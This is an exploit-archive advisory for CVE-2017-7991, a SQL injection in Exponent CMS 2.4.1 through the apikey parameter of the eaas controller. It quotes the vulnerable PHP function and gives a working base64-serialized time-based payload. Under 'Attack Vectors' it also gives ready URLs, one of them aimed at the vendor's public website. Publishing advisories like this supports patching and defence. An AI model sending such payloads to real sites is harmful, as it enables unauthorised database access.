@@ -1,0 +1,98 @@
+id: 27652
+date: 04/21/2017
+title: Exponent CMS 2.4.1 SQL Injection Vulnerability
+author: 404 Not Found
+cves: CVE-2017-7991
+
+CVE-2017-7991-SQL injection-Exponent CMS
+
+[Suggested description]
+Exponent CMS 2.4.1 and earlier has SQL injection  via a base64
+serialized API key (apikey parameter) in the api function  of
+framework/modules/eaas/controllers/eaasController.php.
+ 
+------------------------------------------
+
+[Additional  Information]
+Vulnerable file is:  /framework/modules/eaas/controllers/eaasController.php
+Vulnerable  function is api.
+
+public function api() {
+        if  (empty($this->params['apikey'])) {
+            $_REQUEST['apikey'] =  true;  // set this to force an ajax reply
+            $ar = new  expAjaxReply(550, 'Permission Denied', 'You need an API key in order to access  Exponent as a Service', null);
+            $ar->send();  //FIXME this  doesn't seem to work correctly in this scenario
+        } else  {
+            echo $this->params['apikey'];
+            $key  =  expUnserialize(base64_decode(urldecode($this->params['apikey'])));
+             echo $key;
+            
+            $cfg = new  expConfig($key);
+            $this->config =  $cfg->config;
+            if(empty($cfg->id))  {
+                $ar = new expAjaxReply(550, 'Permission Denied',  'Incorrect API key or Exponent as a Service module configuration missing',  null);
+                $ar->send();
+            } else  {
+                if (!empty($this->params['get']))  {
+                    $this->handleRequest();
+                 } else {
+                    $ar = new expAjaxReply(200, 'ok', 'Your API  key is working, no data requested', null);
+                     $ar->send();
+                }
+            }
+         }
+    }
+
+We can control param $apikey by using  base64_encode and serialize
+functions to encrypt the SQL injection  string. Then, the $apikey will
+be decrypted and cause SQL injection.  Such as, if we want to use
+"aaa\'or sleep(2)#" to inject, we should use  "echo
+base64_encode(serialize($apikey));" to encrypt the Attack  string:
+czoxNjoiYWFhJ29yIHNsZWVwKDIpIyI7 is the result. So,
+http://localhost:88/exponent/index.php?module=eaas&action=api&apikey=czoxNjoiYWFhJ29yIHNsZWVwKDIpIyI7
+ is the PoC. The result is: the site will sleep several seconds, and
+you  can see SQL injection is successful in MySQL logs.
+
+ ------------------------------------------
+
+[Vulnerability  Type]
+SQL Injection
+
+ ------------------------------------------
+
+[Vendor of  Product]
+Exponent CMS
+
+ ------------------------------------------
+
+[Affected Product  Code Base]
+Exponent CMS - 2.4.1 and earlier
+
+ ------------------------------------------
+
+[Affected  Component]
+ \framework\modules\eaas\controllers\eaasController.php,function api(),param  $apikey
+
+------------------------------------------
+ 
+[Attack Type]
+Remote
+
+ ------------------------------------------
+
+[Impact Information  Disclosure]
+true
+
+ ------------------------------------------
+
+[Attack  Vectors]
+http://localhost:88/exponent/index.php?module=eaas&action=api&apikey=czoxNjoiYWFhJ29yIHNsZWVwKDIpIyI7
+ 
+http://www.exponentcms.org/index.php?module=eaas&action=api&apikey=czoxNjoiYWFhJ29yIHNsZWVwKDIpIyI7
+ 
+------------------------------------------
+
+[Discoverer]
+404notfound
+
+#  0day.today [2023-03-24]  #
